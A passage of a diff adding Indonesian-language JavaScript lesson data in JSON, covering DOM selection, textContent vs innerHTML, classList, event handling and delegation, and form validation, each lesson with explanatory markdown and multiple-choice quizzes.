+        "contentMd": "# DOM Tree & Seleksi Elemen (querySelector vs getElementById)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari bagaimana browser mengubah file HTML menjadi pohon objek hidup bernama **DOM (Document Object Model)** dan bagaimana JavaScript memilih elemen di halaman menggunakan **`querySelector`** dan **`querySelectorAll`**.\n\n## Mengapa Konsep Ini Penting?\nHTML adalah struktur teks statis. Agar sebuah tombol bisa merespon klik, menampilkan popup, atau mengubah warna tema, JavaScript harus bisa \"menangkap\" elemen HTML tersebut dari memori browser terlebih dahulu.\n\n## 1. Konsep DOM Tree (Pohon Dokumen)\nKetika browser mengunduh file HTML, browser mengurai (*parse*) setiap tag menjadi sebuah objek **Node** dan menyusunnya dalam struktur pohon berjenjang:\n\n```text\n                 window\n                   │\n                document\n                   │\n                <html>\n            ┌──────┴──────┐\n         <head>         <body>\n           │            ┌───┴───┐\n        <title>       <h1>     <button>\n```\n\n## 2. Seleksi Elemen Modern: `querySelector` & `querySelectorAll`\n\n### A. Memilih Satu Elemen Tunggal (`document.querySelector`)\nMenggunakan sintaks selektor CSS yang persis sama dengan stylesheet Anda:\n\n```javascript\n// Memilih berdasarkan ID (#):\nconst judul = document.querySelector(\"#judul-utama\");\n\n// Memilih berdasarkan Class (.):\nconst tombolBeli = document.querySelector(\".btn-beli\");\n\n// Memilih berdasarkan Atribut:\nconst inputEmail = document.querySelector('input[type=\"email\"]');\n```\n\n### B. Memilih Banyak Elemen Sekaligus (`document.querySelectorAll`)\nMengembalikan sebuah **`NodeList`** yang berisi semua elemen yang cocok:\n\n```javascript\nconst semuaKartu = document.querySelectorAll(\".kartu-produk\");\n\n// NodeList mendukung perulangan forEach bawaan:\nsemuaKartu.forEach((kartu, index) => {\n  console.log(`Memproses kartu ke-${index + 1}`);\n});\n```\n\n## 3. `NodeList` vs `HTMLCollection`\n- **`querySelectorAll` $\\rightarrow$ `NodeList`**: Bersifat statis (snapshot) dan memiliki method bawaan **`.forEach()`**.\n- **`getElementsByClassName` $\\rightarrow$ `HTMLCollection`**: Koleksi hidup (*live collection*) lawas yang TIDAK memiliki `.forEach()`.\n\n## Kesalahan Umum Pemula\n- **Lupa simbol selektor**: Menulis `document.querySelector(\"kartu\")` (tanpa titik) alih-alih `document.querySelector(\".kartu\")`.\n\n## Praktik Mandiri\n1. Buat elemen `<button id=\"btn-klik\" class=\"tombol utama\">Klik Saya</button>`.\n2. Tangkap elemen tersebut di JavaScript menggunakan `document.querySelector(\"#btn-klik\")` dan cetak ke console.\n\n## Ringkasan\n- **DOM** adalah representasi pohon objek dokumen HTML di memori browser.\n- **`document.querySelector()`** memilih 1 elemen pertama yang cocok dengan selektor CSS.\n- **`document.querySelectorAll()`** memilih seluruh elemen yang cocok dalam bentuk **NodeList**.",
+        "quizzes": [
+          {
+            "id": "q-9-1-1",
+            "question": "Apa fungsi utama dari Document Object Model (DOM) dalam browser web?",
+            "options": [
+              "Menyajikan representasi pohon objek berjenjang dari dokumen HTML yang memungkinkan JavaScript membaca dan memanipulasi konten secara dinamis.",
+              "Menyimpan password pengguna di server.",
+              "Mengatur koneksi internet Wi-Fi komputer.",
+              "Menerjemahkan bahasa pemrograman C++ ke Java."
+            ],
+            "correctIndex": 0,
+            "explanation": "DOM bertindak sebagai jembatan API yang memungkinkan JavaScript berinteraksi, memodifikasi, dan merender ulang elemen HTML di browser."
+          },
+          {
+            "id": "q-9-1-2",
+            "question": "Sintaks manakah yang benar untuk memilih elemen pertama yang memiliki class 'btn-submit' menggunakan querySelector?",
+            "options": [
+              "document.querySelector('.btn-submit')",
+              "document.querySelector('btn-submit')",
+              "document.querySelector('#btn-submit')",
+              "document.selectClass('btn-submit')"
+            ],
+            "correctIndex": 0,
+            "explanation": "querySelector menggunakan sintaks selektor CSS standar, sehingga class selector wajib diawali dengan tanda titik (.)."
+          },
+          {
+            "id": "q-9-1-3",
+            "question": "Apa keunggulan NodeList yang dihasilkan oleh document.querySelectorAll dibandingkan HTMLCollection kuno?",
+            "options": [
+              "NodeList memiliki method bawaan .forEach() untuk iterasi langsung dan bersifat static snapshot yang lebih aman dari efek mutasi live tak terduga.",
+              "NodeList otomatis mengubah HTML menjadi file PDF.",
+              "NodeList hanya bisa menyimpan teks angka.",
+              "HTMLCollection dieksekusi oleh GPU sedangkan NodeList oleh CPU."
+            ],
+            "correctIndex": 0,
+            "explanation": "NodeList modern mendukung perulangan fungsional .forEach() secara langsung dan tidak rentan terhadap bug live-mutation saat elemen diubah."
+          }
+        ]
+      },
+      {
+        "id": "lesson-9-2",
+        "stageId": "stage-9",
+        "slug": "manipulasi-konten-atribut-dan-classes",
+        "title": "Manipulasi Konten, Atribut & classList",
+        "titleEn": "DOM Content, Attributes & classList",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Mengubah teks dengan textContent (aman XSS) vs innerHTML, memanipulasi class dengan classList (add, remove, toggle), dan mengatur atribut (setAttribute, getAttribute).",
+        "prerequisites": [
+          "dom-tree-dan-elemen-selection"
+        ],
+        "learningObjectives": [
+          "Membedakan penggunaan textContent (aman injeksi XSS) dengan innerHTML (merender tag HTML).",
+          "Memanipulasi kelas CSS secara dinamis menggunakan classList (add, remove, toggle, contains).",
+          "Membaca dan mengubah atribut elemen dengan setAttribute, getAttribute, dan dataset (data-* attributes)."
+        ],
+        "whyMatters": "Mengubah kelas CSS via `classList.toggle('dark')` adalah mekanisme dasar pembuatan fitur Dark Mode, membuka modal, dan accordion dropdown.",
+        "careerContext": "Prinsip keamanan teks `textContent` wajib dipahami untuk mencegah celah keamanan fatal Cross-Site Scripting (XSS).",
+        "commonMistakes": [
+          "Menggunakan `innerHTML` untuk menampilkan input langsung dari pengguna tanpa sanitasi (sangat rentan peretasan XSS).",
+          "Mengganti `element.className = 'active'` yang menimpa dan menghapus semua kelas lain yang sudah ada pada elemen."
+        ],
+        "keyTerms": [
+          {
+            "term": "textContent",
+            "definition": "Properti untuk membaca atau menulis teks murni secara aman tanpa merender tag HTML."
+          },
+          {
+            "term": "innerHTML",
+            "definition": "Properti untuk membaca atau merender string HTML lengkap (harus disanitasi jika berasal dari input user)."
+          },
+          {
+            "term": "classList",
+            "definition": "Objek utilitas DOM untuk menambah, menghapus, atau men-toggle kelas CSS tanpa menimpa kelas lainnya."
+          },
+          {
+            "term": "data-* (dataset)",
+            "definition": "Atribut kustom HTML5 untuk menyimpan data metadata tambahan pada elemen."
+          }
+        ],
+        "contentMd": "# Manipulasi Konten, Atribut & classList\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara mengubah isi konten elemen (**`textContent`** vs **`innerHTML`**), mengelola kelas styling secara dinamis dengan **`classList`**, serta memanipulasi atribut kustom (**`dataset`**).\n\n## Mengapa Konsep Ini Penting?\nBagaimana cara membuat tombol \"Mode Gelap\" yang seketika mengubah tema seluruh website? Atau bagaimana cara memperbarui skor game di layar saat pemain mencetak poin? Semua interaksi dinamis ini terjadi melalui manipulasi properti DOM.\n\n## 1. Mengubah Konten: `textContent` vs `innerHTML`\n\n### A. `textContent` (Aman, Cepat & Bebas XSS)\nGunakan `textContent` saat Anda hanya ingin memasukkan teks polos:\n```javascript\nconst labelSkor = document.querySelector(\"#skor\");\nlabelSkor.textContent = \"Skor: 100\"; // Aman 100% dari celah keamanan!\n```\n\n### B. `innerHTML` (Merender Tag HTML)\nGunakan `innerHTML` HANYA saat Anda sengaja ingin merender struktur elemen tag HTML baru:\n```javascript\nconst badge = document.querySelector(\"#status\");\nbadge.innerHTML = '<span class=\"teks-hijau\"><strong>AKTIF</strong></span>';\n```\n> **Peringatan Keamanan**: Jangan pernah memasukkan input mentah dari pengguna ke dalam `innerHTML` karena peretas dapat menyisipkan skrip jahat (*Cross-Site Scripting / XSS*).\n\n## 2. Manipulasi Kelas CSS dengan `classList`\nJangan gunakan `element.className = 'baru'` karena akan menghapus kelas-kelas yang sudah ada sebelumnya. Gunakan selalu API modern **`classList`**:\n\n```javascript\nconst kotak = document.querySelector(\".modal-dialog\");\n\n// 1. Menambahkan kelas\nkotak.classList.add(\"tampil\", \"animasi-masuk\");\n\n// 2. Menghapus kelas\nkotak.classList.remove(\"tersembunyi\");\n\n// 3. Men-toggle kelas (Pasang jika belum ada, Lepas jika sudah ada) -> SANGAT POPULER!\nkotak.classList.toggle(\"mode-gelap\");\n\n// 4. Memeriksa keberadaan kelas (Menghasilkan Boolean)\nif (kotak.classList.contains(\"tampil\")) {\n  console.log(\"Modal sedang aktif di layar\");\n}\n```\n\n## 3. Memanipulasi Atribut & `data-*` (Dataset)\n```javascript\nconst tombolAksi = document.querySelector(\"#btn-beli\");\n\n// Mengubah atribut standar:\ntombolAksi.setAttribute(\"disabled\", \"true\");\n\n// Mengakses atribut kustom data-*: <button data-id=\"101\" data-kategori=\"buku\">\nconsole.log(tombolAksi.dataset.id);       // \"101\"\nconsole.log(tombolAksi.dataset.kategori); // \"buku\"\n```\n\n## Kesalahan Umum Pemula\n- **Memakai innerHTML untuk teks sederhana**: `textContent` jauh lebih cepat diproses browser karena tidak memicu HTML parsing engine.\n\n## Praktik Mandiri\n1. Buat tombol `<button id=\"theme-btn\">Ganti Tema</button>`.\n2. Tambahkan script: saat tombol diklik, jalankan `document.body.classList.toggle('dark-theme')`.\n\n## Ringkasan\n- Gunakan **`textContent`** untuk teks polos yang aman dari XSS.\n- Gunakan **`innerHTML`** hanya jika perlu merender markup tag HTML baru.\n- Gunakan **`classList.add()`**, **`.remove()`**, dan **`.toggle()`** untuk mengelola styling secara dinamis.\n- Gunakan **`dataset`** untuk membaca atribut kustom `data-*`.",
+        "quizzes": [
+          {
+            "id": "q-9-2-1",
+            "question": "Mengapa menggunakan textContent jauh lebih direkomendasikan daripada innerHTML ketika menampilkan teks input dari pengguna?",
+            "options": [
+              "textContent hanya memproses teks murni sehingga kebal terhadap serangan injeksi berbahaya Cross-Site Scripting (XSS).",
+              "textContent membuat teks otomatis berkedip di layar.",
+              "innerHTML dilarang oleh konsorsium W3C.",
+              "textContent secara otomatis menerjemahkan bahasa teks."
+            ],
+            "correctIndex": 0,
+            "explanation": "textContent memperlakukan input murni sebagai string teks dan tidak mengeksekusi tag HTML/script jahat, mencegah celah fatal XSS."
+          },
+          {
+            "id": "q-9-2-2",
+            "question": "Method classList manakah yang paling ideal digunakan untuk membuat tombol saklar Dark Mode (memasang class jika belum ada, atau mencopot class jika sudah ada)?",
+            "options": [
+              "element.classList.toggle('dark')",
+              "element.classList.add('dark')",
+              "element.classList.remove('dark')",
+              "element.classList.switch('dark')"
+            ],
+            "correctIndex": 0,
+            "explanation": "classList.toggle('dark') secara otomatis menambahkan kelas jika belum ada, dan menghapusnya jika sudah ada dalam satu perintah."
+          },
+          {
+            "id": "q-9-2-3",
+            "question": "Jika sebuah elemen HTML ditulis <div id=\"kartu\" data-user-id=\"42\"></div>, bagaimana cara membaca nilai ID tersebut di JavaScript menggunakan API dataset?",
+            "options": [
+              "document.querySelector('#kartu').dataset.userId",
+              "document.querySelector('#kartu').dataset['data-user-id']",
+              "document.querySelector('#kartu').getData('user-id')",
+              "document.querySelector('#kartu').getAttributeValue('user')"
+            ],
+            "correctIndex": 0,
+            "explanation": "Atribut HTML5 data-user-id secara otomatis dikonversi menjadi properti camelCase dataset.userId di JavaScript."
+          }
+        ]
+      },
+      {
+        "id": "lesson-9-3",
+        "stageId": "stage-9",
+        "slug": "event-listeners-dan-event-object",
+        "title": "Event Listeners & Event Object (e.target, e.preventDefault)",
+        "titleEn": "Event Listeners & Event Object",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Menangani interaksi user dengan addEventListener (click, input, submit, keydown), parameter Event Object (e), e.target, dan e.preventDefault().",
+        "prerequisites": [
+          "manipulasi-konten-atribut-dan-classes"
+        ],
+        "learningObjectives": [
+          "Mendaftarkan event interaksi menggunakan method element.addEventListener().",
+          "Menggunakan parameter Event Object (e) untuk membaca informasi interaksi.",
+          "Mencegah perilaku bawaan browser (seperti reload halaman pada submit form) menggunakan e.preventDefault().",
+          "Membaca elemen pemicu interaksi menggunakan e.target."
+        ],
+        "whyMatters": "Aplikasi web interaktif dibangun di atas sistem Event-Driven Programming: mendengarkan tindakan user dan meresponnya seketika.",
+        "careerContext": "Event handling adalah tulang punggung seluruh interaksi UI modern di React (onClick, onChange, onSubmit).",
+        "commonMistakes": [
+          "Lupa memanggil `e.preventDefault()` pada event form `submit`, menyebabkan halaman web me-reload dan data form hilang.",
+          "Menulis nama event dengan prefix `on` di addEventListener (tulis `'click'`, bukan `'onclick'`)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Event Listener",
+            "definition": "Fungsi pendengar yang menunggu dan mengeksekusi callback saat suatu kejadian/interaksi terjadi pada elemen."
+          },
+          {
+            "term": "Event Object (e)",
+            "definition": "Objek otomatis yang berisi seluruh metadata tentang kejadian yang baru saja terjadi (koordinat klik, tombol keyboard, target elemen)."
+          },
+          {
+            "term": "e.preventDefault()",
+            "definition": "Method untuk membatalkan aksi bawaan browser yang terikat pada event tersebut."
+          }
+        ],
+        "contentMd": "# Event Listeners & Event Object (e.target, e.preventDefault)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara merespon tindakan pengguna menggunakan **`addEventListener`**, mengekstrak data interaksi dari **Event Object (`e`)**, serta mencegah aksi bawaan browser dengan **`e.preventDefault()`**.\n\n## Mengapa Konsep Ini Penting?\nWebsite statis menjadi aplikasi hidup ketika dapat merespon klik mouse, ketikan keyboard, pergeseran scroll, atau pengiriman formulir pengguna.\n\n## 1. Mendaftarkan Event: `addEventListener`\nSintaks standar: `element.addEventListener(\"namaEvent\", callbackFunction)`:\n\n```javascript\nconst tombol = document.querySelector(\"#btn-sapa\");\n\ntombol.addEventListener(\"click\", () => {\n  console.log(\"Tombol berhasil diklik!\");\n});\n```\n\n> **Catatan**: Nama event ditulis tanpa kata \"on\" (gunakan `\"click\"`, `\"input\"`, `\"submit\"`, `\"keydown\"`).\n\n## 2. Mengenal Event Object (`e` / `event`)\nBrowser secara otomatis mengirimkan sebuah objek informasi ke dalam parameter callback fungsi Anda:\n\n```javascript\nconst inputNama = document.querySelector(\"#input-nama\");\n\ninputNama.addEventListener(\"input\", (e) => {\n  // e.target merujuk ke elemen <input> yang sedang diketik\n  console.log(\"Karakter saat ini:\", e.target.value);\n});\n\nwindow.addEventListener(\"keydown\", (e) => {\n  // Mendeteksi tombol keyboard yang ditekan pengguna\n  if (e.key === \"Escape\") {\n    console.log(\"Pengguna menekan tombol ESC -> Tutup Modal!\");\n  }\n});\n```\n\n## 3. Mencegah Perilaku Default: `e.preventDefault()`\nBeberapa elemen HTML memiliki perilaku bawaan (*default browser action*):\n- Formulir `<form>` otomatis **me-reload seluruh halaman** saat tombol submit ditekan.\n- Link `<a href=\"...\">` otomatis berpindah halaman.\n\nGunakan **`e.preventDefault()`** untuk menghentikan reload dan mengambil alih proses dengan JavaScript:\n\n```javascript\nconst formLogin = document.querySelector(\"#form-login\");\n\nformLogin.addEventListener(\"submit\", (e) => {\n  e.preventDefault(); // KUNCI: Cegah halaman me-reload!\n  \n  console.log(\"Memproses login dengan AJAX/Fetch tanpa reload...\");\n});\n```\n\n## Kesalahan Umum Pemula\n- **Langsung memanggil fungsi di addEventListener**: Menulis `addEventListener('click', hitung())` dengan tanda kurung akan langsung mengeksekusi fungsi saat script dimuat. Wajib tuliskan nama fungsinya saja sebagai referensi: `addEventListener('click', hitung)`.\n\n## Praktik Mandiri\n1. Buat form sederhana dengan sebuah input teks dan tombol submit.\n2. Pasang event listener submit dengan `e.preventDefault()` dan tampilkan isi teks input di layar menggunakan alert.\n\n## Ringkasan\n- Gunakan **`element.addEventListener(\"event\", callback)`** untuk mendengarkan interaksi.\n- **Event Object (`e`)** memuat data detail seperti **`e.target`** (elemen asal) dan **`e.key`** (tombol keyboard).\n- Selalu gunakan **`e.preventDefault()`** pada form submit untuk mencegah reload halaman.",
+        "quizzes": [
+          {
+            "id": "q-9-3-1",
+            "question": "Mengapa pemanggilan e.preventDefault() sangat krusial di dalam event listener pengiriman formulir (submit)?",
+            "options": [
+              "Untuk mencegah perilaku bawaan browser yang me-reload seluruh halaman, memungkinkan pengiriman data formulir diproses secara mulus di balik layar via JavaScript.",
+              "Untuk mengunci komputer pengguna.",
+              "Untuk menghapus seluruh isi database server.",
+              "Agar browser menutup tab secara otomatis."
+            ],
+            "correctIndex": 0,
+            "explanation": "e.preventDefault() menghentikan aksi bawaan browser (seperti reload halaman pada submit form atau navigasi URL pada tag link)."
+          },
+          {
+            "id": "q-9-3-2",
+            "question": "Properti apakah pada Event Object (e) yang merujuk secara langsung ke elemen HTML yang memicu terjadinya event tersebut?",
+            "options": [
+              "e.target",
+              "e.element",
+              "e.source",
+              "e.origin"
+            ],
+            "correctIndex": 0,
+            "explanation": "e.target merujuk langsung ke elemen DOM spesifik tempat terjadinya interaksi awal (misal elemen input yang sedang diketik)."
+          },
+          {
+            "id": "q-9-3-3",
+            "question": "Bagaimana cara penulisan pendaftaran event click yang benar pada sebuah tombol di JavaScript?",
+            "options": [
+              "tombol.addEventListener('click', handleKlik)",
+              "tombol.addEventListener('onclick', handleKlik)",
+              "tombol.addEvent('click' -> handleKlik())",
+              "tombol.listen('on-click', handleKlik)"
+            ],
+            "correctIndex": 0,
+            "explanation": "Sintaks resmi DOM Level 2 adalah element.addEventListener('nama_event', callback) tanpa prefix 'on'."
+          }
+        ]
+      },
+      {
+        "id": "lesson-9-4",
+        "stageId": "stage-9",
+        "slug": "event-bubbling-capturing-dan-delegation",
+        "title": "Event Bubbling, Capturing & Event Delegation",
+        "titleEn": "Event Bubbling & Event Delegation",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Memahami fase propagasi event (Capturing -> Target -> Bubbling), e.stopPropagation(), dan pola efisiensi Event Delegation.",
+        "prerequisites": [
+          "event-listeners-dan-event-object"
+        ],
+        "learningObjectives": [
+          "Menjelaskan 3 fase propagasi event: Capturing Phase, Target Phase, dan Bubbling Phase.",
+          "Menghentikan perambatan event ke elemen induk menggunakan e.stopPropagation().",
+          "Menerapkan pola arsitektur performa tinggi: Event Delegation (memasang 1 listener pada parent untuk menangani ribuan item anak dinamis)."
+        ],
+        "whyMatters": "Event Delegation mencegah pemborosan memori (memasang 1000 listener vs 1 listener) dan memastikan elemen dinamis yang baru dibuat otomatis memiliki event handler.",
+        "careerContext": "React menggunakan pola Event Delegation tunggal pada root container (`document`/root) untuk seluruh Synthetic Events-nya.",
+        "commonMistakes": [
+          "Memasang ratusan `addEventListener` individual di dalam loop perulangan array item (memboroskan memori).",
+          "Menggunakan `e.stopPropagation()` sembarangan yang merusak pelacakan analitik global."
+        ],
+        "keyTerms": [
+          {
+            "term": "Event Bubbling",
+            "definition": "Fase di mana event merambat naik ke atas dari elemen target menuju ke seluruh elemen leluhur induknya seperti gelembung air."
+          },
+          {
+            "term": "Event Delegation",
+            "definition": "Pola desain performa tinggi dengan menempatkan satu event listener pada elemen induk untuk mengelola seluruh elemen anaknya."
+          },
+          {
+            "term": "e.stopPropagation()",
+            "definition": "Method untuk menghentikan perambatan naik (bubbling) event ke elemen leluhur di atasnya."
+          }
+        ],
+        "contentMd": "# Event Bubbling, Capturing & Event Delegation\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari bagaimana event merambat melalui pohon DOM (**Event Bubbling & Capturing**), cara menghentikan perambatan dengan **`e.stopPropagation()`**, serta teknik optimasi memori paling populer: **Event Delegation**.\n\n## Mengapa Konsep Ini Penting?\nJika Anda memiliki daftar belanja dengan 1.000 barang dan setiap barang memiliki tombol \"Hapus\", apakah Anda harus memasang 1.000 event listener? Tentu tidak! Event Delegation memungkinkan Anda hanya memasang **1 listener saja** pada kontainer induk untuk mengelola 1.000 barang tersebut secara efisien.\n\n## 1. Siklus Propagasi Event: Bubbling & Capturing\nKetika Anda mengklik tombol di dalam sebuah `<div class=\"kartu\">`:\n\n```text\n1. CAPTURING PHASE : Event turun dari Window -> Document -> Body -> Div\n2. TARGET PHASE    : Event mencapai Tombol target yang diklik\n3. BUBBLING PHASE  : Event NAIK MERAMBAT dari Tombol -> Div -> Body -> Document -> Window\n```\n\nSecara default, semua event listener di JavaScript mendengarkan pada fase **Bubbling** (naik ke atas seperti gelembung udara).\n\n```javascript\n// Jika kartu dan tombol sama-sama memiliki event click:\ntombol.addEventListener(\"click\", (e) => {\n  console.log(\"1. Tombol diklik\");\n  // e.stopPropagation(); // Jika diaktifkan, event BERHENTI di sini dan tidak naik ke kartu\n});\n\nkartu.addEventListener(\"click\", () => {\n  console.log(\"2. Kartu diklik (karena efek Bubbling)\");\n});\n```\n\n## 2. Pola Hebat: Event Delegation (Satu untuk Semua)\nDaripada memasang listener pada setiap `<li>`, pasang **1 listener** pada elemen `<ul>` induk dan gunakan **`e.target.closest()`** atau `e.target.matches()`:\n\n```html\n<ul id=\"daftar-tugas\">\n  <li data-id=\"1\">Belajar HTML <button class=\"btn-hapus\">Hapus</button></li>\n  <li data-id=\"2\">Belajar CSS <button class=\"btn-hapus\">Hapus</button></li>\n  <li data-id=\"3\">Belajar JS <button class=\"btn-hapus\">Hapus</button></li>\n</ul>\n\n<script>\n  const daftarTugas = document.querySelector(\"#daftar-tugas\");\n\n  // HANYA 1 LISTENER PADA PARENT:\n  daftarTugas.addEventListener(\"click\", (e) => {\n    // Periksa apakah yang diklik adalah tombol hapus\n    if (e.target.classList.contains(\"btn-hapus\")) {\n      const itemLi = e.target.closest(\"li\");\n      console.log(\"Menghapus item ID:\", itemLi.dataset.id);\n      itemLi.remove(); // Hapus item dari layar\n    }\n  });\n</script>\n```\n\n### Keunggulan Event Delegation:\n1. **Sangat Hemat Memori**: Hanya 1 listener terdaftar di RAM browser.\n2. **Mendukung Elemen Dinamis**: Jika ada tugas baru ditambahkan ke dalam daftar 5 menit kemudian, tombol hapusnya **otomatis langsung berfungsi** tanpa perlu mendaftarkan listener baru!\n\n## Kesalahan Umum Pemula\n- **Memasang listener di dalam forEach untuk data dinamis**: Mengakibatkan elemen baru yang ditambahkan belakangan tidak bereaksi saat diklik.\n\n## Praktik Mandiri\n1. Buat kontainer galeri dengan 5 gambar.\n2. Pasang 1 event click pada kontainer galeri dan cetak `alt` text gambar yang diklik menggunakan `e.target`.\n\n## Ringkasan\n- **Event Bubbling** menyebabkan event merambat naik dari elemen target ke seluruh leluhur induknya.\n- **`e.stopPropagation()`** menghentikan perambatan gelembung event tersebut.\n- **Event Delegation** adalah teknik memasang satu listener pada induk untuk menangani seluruh anak, menghasilkan kode yang hemat memori dan ramah elemen dinamis.",
+        "quizzes": [
+          {
+            "id": "q-9-4-1",
+            "question": "Apa yang dimaksud dengan 'Event Bubbling' dalam arsitektur DOM browser?",
+            "options": [
+              "Fase di mana sebuah event merambat naik ke atas dari elemen target anak menuju ke seluruh elemen leluhur induknya di pohon DOM.",
+              "Proses menghapus cache browser secara berkala.",
+              "Animasi gelembung sabun pada elemen latar belakang.",
+              "Error saat file JavaScript gagal diunduh."
+            ],
+            "correctIndex": 0,
+            "explanation": "Event bubbling adalah perilaku bawaan di mana event memicu handler pada elemen target lalu merambat naik ke setiap ancestor parent-nya."
+          },
+          {
+            "id": "q-9-4-2",
+            "question": "Apa keuntungan utama menerapkan pola 'Event Delegation' pada daftar list yang berisi ratusan item dinamis?",
+            "options": [
+              "Menghemat memori secara signifikan (cukup 1 listener pada parent) dan memastikan elemen baru yang ditambahkan dinamis otomatis langsung memiliki event handler aktif.",
+              "Membuat teks list berubah warna menjadi emas.",
+              "Mempercepat kecepatan koneksi internet pengguna.",
+              "Menghilangkan kebutuhan file HTML."
+            ],
+            "correctIndex": 0,
+            "explanation": "Event delegation memanfaatkan bubbling untuk menangani interaksi seluruh elemen anak (termasuk yang baru di-render) via 1 listener pada parent."
+          },
+          {
+            "id": "q-9-4-3",
+            "question": "Method apakah yang digunakan pada Event Object untuk mencegah event merambat naik lebih jauh ke elemen-elemen induk di atasnya?",
+            "options": [
+              "e.stopPropagation()",
+              "e.preventDefault()",
+              "e.haltExecution()",
+              "e.cancelBubbleNow()"
+            ],
+            "correctIndex": 0,
+            "explanation": "e.stopPropagation() menghentikan perambatan propagasi (bubbling/capturing) event pada rantai DOM."
+          }
+        ]
+      },
+      {
+        "id": "lesson-9-5",
+        "stageId": "stage-9",
+        "slug": "form-handling-dan-client-side-validation",
+        "title": "Form Handling & Client-Side Validation",
+        "titleEn": "Form Handling & Client-Side Validation",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 15,
+        "description": "Membaca data form dengan FormData API, validasi input real-time (regex email, panjang password), menampilkan pesan error dinamis, dan Constraint Validation API.",
+        "prerequisites": [
+          "event-bubbling-capturing-dan-delegation"
+        ],
+        "learningObjectives": [
+          "Mengekstrak seluruh data formulir secara otomatis menggunakan FormData API.",
+          "Menerapkan validasi input interaktif (validasi format email, nomor telepon, dan kekuatan password).",
+          "Menampilkan pesan error umpan balik secara ramah pengguna (User Feedback) dan mengelola status disable tombol submit.",
+          "Menjelaskan bahwa validasi client-side adalah untuk kenyamanan UX dan WAJIB didampingi validasi server-side untuk keamanan."
+        ],
+        "whyMatters": "Validasi formulir yang ramah dan instan mencegah frustrasi pengguna saat mendaftar akun atau melakukan transaksi.",
+        "careerContext": "Form handling di Next.js/React berbasiskan FormData API standar web ini (Server Actions / Zod schemas).",
+        "commonMistakes": [
+          "Hanya mengandalkan validasi di sisi client (frontend) dan lupa bahwa validasi client mudah dibobol tanpa validasi sisi server (backend).",
+          "Membaca input satu per satu secara manual dengan 10 baris `document.querySelector` alih-alih menggunakan `new FormData(form)`."
+        ],
+        "keyTerms": [
+          {
+            "term": "FormData",
+            "definition": "Objek web standar untuk mengumpulkan pasangan kunci-nilai dari seluruh elemen input formulir secara otomatis."
+          },
+          {
+            "term": "Client-Side Validation",
+            "definition": "Pemeriksaan format data di browser pengguna sebelum data dikirimkan ke server untuk memberikan umpan balik instan."
+          },
+          {
+            "term": "Constraint Validation API",
+            "definition": "API bawaan browser seperti `checkValidity()` dan `setCustomValidity()`."
+          }
+        ],
+        "contentMd": "# Form Handling & Client-Side Validation\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara mengelola formulir secara profesional: mengekstrak seluruh data secara instan menggunakan **`FormData` API**, melakukan **validasi client-side real-time**, dan memberikan umpan balik error yang ramah pengguna.\n\n## Mengapa Konsep Ini Penting?\nFormulir adalah pintu masuk data utama aplikasi (pendaftaran, login, transaksi). Validasi yang baik memberikan rasa aman dan memandu pengguna memperbaiki kesalahan sebelum data dikirim ke server.\n\n## 1. Ekstraksi Cepat dengan `FormData` API\nDaripada mengambil nilai `input1.value`, `input2.value` satu per satu, gunakan objek standar **`FormData`**:\n\n```html\n<form id=\"form-daftar\">\n  <input type=\"text\" name=\"username\" required />\n  <input type=\"email\" name=\"email\" required />\n  <input type=\"password\" name=\"password\" required />\n  <button type=\"submit\">Daftar</button>\n</form>\n\n<script>\n  const form = document.querySelector(\"#form-daftar\");\n\n  form.addEventListener(\"submit\", (e) => {\n    e.preventDefault();\n\n    // Otomatis mengambil semua input berdasarkan atribut 'name':\n    const formData = new FormData(form);\n    \n    // Ubah langsung menjadi Objek JavaScript biasa:\n    const dataKirim = Object.fromEntries(formData);\n    console.log(\"Data Siap Kirim:\", dataKirim);\n    // { username: \"...\", email: \"...\", password: \"...\" }\n  });\n</script>\n```\n\n## 2. Validasi Real-Time & Umpan Balik UX\nBerikan umpan balik instan saat pengguna mengetik (*on input*):\n\n```javascript\nconst inputPassword = document.querySelector('input[name=\"password\"]');\nconst errorLabel = document.querySelector(\"#password-error\");\n\ninputPassword.addEventListener(\"input\", (e) => {\n  const nilai = e.target.value;\n  \n  if (nilai.length < 8) {\n    errorLabel.textContent = \"Password harus minimal 8 karakter!\";\n    inputPassword.classList.add(\"input-error\");\n  } else {\n    errorLabel.textContent = \"\";\n    inputPassword.classList.remove(\"input-error\");\n  }\n});\n```\n\n## 3. Aturan Emas Keamanan: Client vs Server Validation\n- **Client-Side Validation (Frontend)**: Bertujuan untuk **User Experience (UX)** — memberikan umpan balik cepat agar pengguna tidak perlu menunggu respon server.\n- **Server-Side Validation (Backend)**: Bertujuan untuk **Keamanan Mutlak (Security)** — wajib selalu ada karena validasi frontend dapat dilewati dengan mudah oleh peretas menggunakan Postman atau mematikan JavaScript di browser.\n\n## Kesalahan Umum Pemula\n- **Lupa atribut `name` pada input**: Objek `FormData` membutuhkan atribut `name=\"...\"` pada setiap tag `<input>` agar dapat mengenali kuncinya.\n\n## Praktik Mandiri\n1. Buat form kontak dengan field nama, email, dan pesan.\n2. Gunakan `new FormData(e.target)` pada event submit dan cetak hasilnya dengan `Object.fromEntries()`.\n\n## Ringkasan\n- Gunakan **`new FormData(form)`** dan **`Object.fromEntries()`** untuk mengambil data seluruh formulir secara otomatis.\n- Berikan umpan balik validasi instan pada event **`input`** atau **`change`**.\n- Validasi client-side adalah untuk **UX**, sedangkan validasi server-side adalah jaminan **Keamanan Mutlak**.",
+        "quizzes": [
+          {
+            "id": "q-9-5-1",
+            "question": "Bagaimana cara paling ringkas dan modern untuk mengambil seluruh pasangan data input dari sebuah formulir HTML menjadi objek JavaScript?",
+            "options": [
+              "const data = Object.fromEntries(new FormData(formElement));",
+              "const data = formElement.getAllInputsAsObject();",
+              "const data = JSON.parse(formElement);",
+              "const data = formElement.serializeAll();"
+            ],
+            "correctIndex": 0,
+            "explanation": "Kombinasi FormData(form) dan Object.fromEntries() secara instan mengekstrak seluruh nilai input yang memiliki atribut name menjadi objek reguler."
+          },
+          {
